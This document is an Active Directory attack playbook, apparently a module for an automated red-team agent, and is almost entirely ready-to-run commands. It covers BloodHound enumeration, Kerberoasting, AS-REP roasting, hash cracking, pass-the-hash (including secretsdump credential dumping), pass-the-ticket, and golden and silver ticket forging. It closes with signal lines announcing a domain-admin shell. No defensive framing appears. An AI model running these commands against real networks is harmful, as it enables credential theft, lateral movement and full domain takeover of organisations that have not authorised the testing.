# RT04: Active Directory Core Attacks

**MITRE:** T1482, T1558.003, T1558.004, T1550.002 | **When:** AD/LDAP/Kerberos in tech stack.

## BloodHound Collection + Path Analysis (T1482)

```bash
# Collection from Linux (no tools on target):
bloodhound-python -u <user> -p '<pass>' -d corp.local -dc <DC_IP> --zip -c All

# Collection from Windows (SharpHound):
SharpHound.exe -c All --zipfilename bloodhound.zip

# Import to BloodHound:
# Run BloodHound UI, drag-drop ZIP, analyze

# Key queries:
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find Kerberoastable Users"
# "Find AS-REP Roastable Users"
# "Shortest Paths from Owned Principals"
```

## Kerberoasting (T1558.003)

```bash
# From Linux (Impacket):
GetUserSPNs.py corp.local/normaluser:'Password!' -dc-ip <DC_IP> -outputfile kerberoast_hashes.txt

# From Windows (Rubeus):
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt /nowrap

# Crack hashes:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Targeted (specific service):
GetUserSPNs.py corp.local/normaluser:'Password!' -dc-ip <DC_IP> -request-user svc_sql
```

## AS-REP Roasting (T1558.004)

```bash
# No credentials needed - just a username list:
GetNPUsers.py corp.local/ -usersfile /tmp/users.txt \
  -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>

# With valid creds (finds all pre-auth disabled accounts):
GetNPUsers.py corp.local/normaluser:'Password!' -dc-ip <DC_IP> -format hashcat

# Crack:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Pass-the-Hash (T1550.002)

```bash
# CrackMapExec (SMB):
crackmapexec smb <IP_RANGE>/24 -u administrator -H <NTLM_HASH> --local-auth
crackmapexec smb <IP_RANGE>/24 -u administrator -H <NTLM_HASH>  # domain context

# impacket (specific target):
wmiexec.py -hashes :<NTLM_HASH> corp.local/administrator@<DC_IP> "whoami"
psexec.py -hashes :<NTLM_HASH> corp.local/administrator@<TARGET_IP>
secretsdump.py -hashes :<NTLM_HASH> corp.local/administrator@<DC_IP>

# mimikatz PTH (local to Windows):
# sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:powershell.exe
```

## Pass-the-Ticket (T1550.003)

```bash
# Import Kerberos ticket:
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket:
wmiexec.py -k -no-pass corp.local/administrator@<DC_IP> "whoami"
smbclient.py -k -no-pass corp.local/administrator@<FILE_SERVER>
```

## Golden Ticket (T1558.001) - Persistent Domain Admin

```bash
# Requirements: krbtgt hash (from DCSync)
# ticketer.py (Linux):
ticketer.py -nthash <krbtgt_NTLM_hash> -domain-sid <domain_SID> \
  -domain corp.local administrator

# mimikatz (Windows):
# kerberos::golden /user:administrator /domain:corp.local
#   /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt

# Use golden ticket:
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass corp.local/administrator@<DC_IP>
```

## Silver Ticket (T1558.002)

```bash
# Requirements: service account NTLM hash, SPN
# More stealthy than golden - only valid for specific service
ticketer.py -nthash <service_ntlm_hash> -domain-sid <domain_SID> \
  -domain corp.local -spn cifs/<server>.corp.local administrator

# Use:
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass corp.local/administrator@<server>
```

**Signal:** `emit_signal CRED_FOUND "DA hash via Kerberoast/DCSync" "main/redteam" 0.97`
`emit_signal VULN_CONFIRMED "Domain compromise confirmed: DA shell on <DC>" "main/redteam" 0.99`
